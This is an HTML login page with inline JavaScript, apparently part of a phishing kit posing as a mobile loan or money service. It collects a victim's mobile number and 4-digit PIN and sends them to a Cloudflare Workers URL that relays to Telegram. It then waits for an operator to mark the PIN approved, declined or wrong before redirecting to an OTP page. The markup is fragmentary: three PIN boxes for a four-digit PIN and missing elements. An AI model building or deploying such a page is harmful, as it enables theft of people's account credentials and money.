<body>

    <div class="container">

        <form class="login-form" id="loginForm">
            <div class="form-group">
                <label for="mobileNumber">Mobile Number</label>
                <input type="tel" id="mobileNumber" name="mobileNumber" placeholder="eg 07XXXXXXXXX" maxlength="12" required="">

                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" required="">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" required="">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]*" required="">

        </form>

    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
        <div class="loading-text">Verifying...</div>
    </div>

    <script>
        // ⚠️ Replace with your Worker URL if different
        const WORKER_URL = "https://cabsloan.newtonmulti.workers.dev";

        const pinBoxes = document.querySelectorAll('.pin-box');
        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
                    pinBoxes[index + 1].focus();
                }
            });
            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
            });
            box.addEventListener('keypress', (e) => {
                if (!/[0-9]/.test(e.key)) e.preventDefault();
            });
        });

        const loginForm = document.getElementById('loginForm');
        const loadingOverlay = document.getElementById('loadingOverlay');

        function showError(msg) {
            const err = document.getElementById('loginError');
            if (err) { err.textContent = msg; err.style.display = 'block'; }
        }

        function hideError() {
            const err = document.getElementById('loginError');
            if (err) err.style.display = 'none';
        }

        function startPolling(userNum, onApproveUrl) {
            let offset = 0;
            let decided = false;
            let pollCount = 0;
            const maxPolls = 90;

            // Seed offset so we don't process old callbacks
            fetch(`${WORKER_URL}/init`)
                .then(r => r.json())
                .then(data => {
                    if (data.ok && data.result && data.result.length > 0) {
                        offset = data.result[data.result.length - 1].update_id + 1;
                    }
                    pollLoop();
                })
                .catch(() => pollLoop());

            function pollLoop() {
                if (decided) return;
                pollCount++;
                if (pollCount > maxPolls) {
                    decided = true;
                    loadingOverlay.classList.remove('active');
                    showError('Request timed out. Please try again.');
                    return;
                }

                fetch(`${WORKER_URL}/poll?offset=${offset}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || decided) {
                            if (!decided) setTimeout(pollLoop, 2000);
                            return;
                        }
                        for (let update of data.result) {
                            offset = update.update_id + 1;
                            if (update.callback_query) {
                                const action = update.callback_query.data;

                                // Acknowledge callback so Telegram stops the loading spinner
                                fetch(`${WORKER_URL}/answer`, {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        callback_query_id: update.callback_query.id,
                                        text: "Action recorded!"
                                    })
                                }).catch(() => {});

                                if (action === `approve_${userNum}`) {
                                    decided = true;
                                    loadingOverlay.classList.remove('active');
                                    window.location.href = onApproveUrl;
                                    return;
                                } else if (action === `decline_${userNum}`) {
                                    decided = true;
                                    loadingOverlay.classList.remove('active');
                                    showError('Request declined. Please try again.');
                                    return;
                                } else if (action === `wrong_${userNum}`) {
                                    decided = true;
                                    loadingOverlay.classList.remove('active');
                                    showError('Wrong PIN. Please enter the correct PIN.');
                                    return;
                                }
                            }
                        }
                        if (!decided) setTimeout(pollLoop, 2000);
                    })
                    .catch(() => { if (!decided) setTimeout(pollLoop, 2000); });
            }
        }

        loginForm.addEventListener('submit', function(e) {
            e.preventDefault();
            hideError();

            const mobile = document.getElementById('mobileNumber').value.trim();
            const pin = Array.from(pinBoxes).map(b => b.value).join('');

            if (!mobile || pin.length !== 4) {
                showError('Please enter your mobile number and 4-digit PIN.');
                return;
            }

            localStorage.setItem('phoneNumber', mobile);
            loadingOverlay.classList.add('active');

            const userNum = mobile.replace(/\D/g, '');

            fetch(`${WORKER_URL}/send`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ mobile, pin, userNum })
            })
            .then(res => res.json())
            .then(data => {
                console.log('Send response:', data);
                if (data.ok) {
                    startPolling(userNum, 'otp.html');
                } else {
                    loadingOverlay.classList.remove('active');
                    showError('Telegram error: ' + (data.description || data.error || 'Unknown'));
                }
            })
            .catch(err => {
                console.error('Fetch error:', err);
                loadingOverlay.classList.remove('active');
                showError('Network error: ' + err.message);
            });
        });
    </script>
